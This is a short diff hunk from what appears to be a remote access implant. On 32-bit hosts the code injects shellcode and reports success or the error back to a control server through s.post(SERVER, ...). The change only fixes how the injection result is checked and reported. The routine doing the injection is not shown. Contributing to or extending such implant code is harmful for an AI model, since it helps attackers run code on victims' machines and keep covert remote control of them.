@@ -299,10 +299,10 @@ try:
                             if not is_os_64bit():
                                 if shellcode:
                                     res = inject_shellcode()
-                                    if res:
+                                    if res == True:
                                         s.post(SERVER, data="Shellcode injected successfully...")
                                     else:
-                                        s.post(SERVER, data=error)
+                                        s.post(SERVER, data=res) # res in this case is the error...
                                 else:
                                     s.post(SERVER, data='No shellcode specified...')
                         else:
